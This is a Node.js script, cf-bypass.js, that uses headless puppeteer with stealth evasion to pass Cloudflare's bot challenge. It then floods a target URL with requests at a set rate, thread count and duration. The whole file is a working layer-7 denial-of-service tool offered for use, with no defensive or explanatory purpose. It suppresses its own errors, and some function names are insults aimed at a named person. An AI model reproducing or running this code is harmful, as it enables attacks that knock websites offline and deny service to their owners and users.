const puppeteer = require('puppeteer-extra');
const { Cluster } = require('puppeteer-cluster');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');
const v8 = require('v8');

v8.setFlagsFromString('--max_old_space_size=2048');
v8.setFlagsFromString('--max_new_space_size=256');
v8.setFlagsFromString('--optimize_for_size');
v8.setFlagsFromString('--always_compact');
v8.setFlagsFromString('--expose_gc');
global.gc && global.gc();

puppeteer.use(StealthPlugin());

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  rps: parseInt(process.argv[4]) || 10000,
  threads: parseInt(process.argv[5]) || 8
};

if (process.argv.length < 4) {
  console.log("node cf-bypass.js <target> <time> <rps> <threads>");
  process.exit(1);
}

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
];

const getRandomUserAgent = () => {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
};

const getRandomInt = (min, max) => {
  return Math.floor(Math.random() * (max - min + 1)) + min;
};

const ditmetuanhai = async ({ page, data: target }) => {
  await page.setUserAgent(getRandomUserAgent());
  await page.setViewport({
    width: getRandomInt(1024, 1920),
    height: getRandomInt(768, 1080),
    deviceScaleFactor: 1
  });
  
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, 'webdriver', {
      get: () => undefined,
    });
  });
  
  await page.setDefaultNavigationTimeout(30000);
  
  try {
    await page.goto(target, { 
      waitUntil: 'domcontentloaded',
      timeout: 20000 
    });
    
    const cookies = await page.cookies();
    const cfClearance = cookies.find(cookie => cookie.name === 'cf_clearance');
    
    if (cfClearance) {
      console.log(`[+] Got cf_clearance`);
      
      const tuanhaisucvat = async () => {
        try {
          const requestsPerBatch = Math.ceil(args.rps / args.threads);
          
          for (let i = 0; i < requestsPerBatch; i++) {
            await page.evaluate(() => {
              fetch(window.location.href, {
                method: 'GET',
                headers: {
                  'Cache-Control': 'no-cache',
                  'Pragma': 'no-cache'
                }
              }).catch(() => {});
            });
            
            if (i % 5 === 0) {
              await new Promise(resolve => setTimeout(resolve, 10));
            }
          }
          
          setTimeout(tuanhaisucvat, 1000);
        } catch (error) {
          setTimeout(tuanhaisucvat, 2000);
        }
      };
      
      setTimeout(tuanhaisucvat, 1000);
    } else {
      setTimeout(() => ditmetuanhai({ page, data: target }), 3000);
    }
  } catch (error) {
    setTimeout(() => ditmetuanhai({ page, data: target }), 3000);
  }
};

const tuanhaiaisucvat = async () => {
  console.log(`[!] Starting L7 Cloudflare Bypass Attack...`);
  console.log(`[>] Target: ${args.target}`);
  console.log(`[>] Time: ${args.time}s`);
  console.log(`[>] Target RPS: ${args.rps.toLocaleString()}`);
  console.log(`[>] Threads: ${args.threads}`);
  console.log(`[>] Memory Limit: 3GB RAM`);
  
  const cluster = await Cluster.launch({
    puppeteer,
    maxConcurrency: args.threads,
    puppeteerOptions: {
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--disable-gpu',
        '--single-process',
        '--window-size=1024,768'
      ]
    }
  });
  
  await cluster.task(ditmetuanhai);
  
  for (let i = 0; i < args.threads; i++) {
    cluster.queue(args.target);
  }
  
  setTimeout(async () => {
    await cluster.idle();
    await cluster.close();
    console.log(`[!] Attack finished. Exiting...`);
    process.exit(0);
  }, args.time * 1000);
};

tuanhaiaisucvat().catch(error => {
  process.exit(1);
});

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
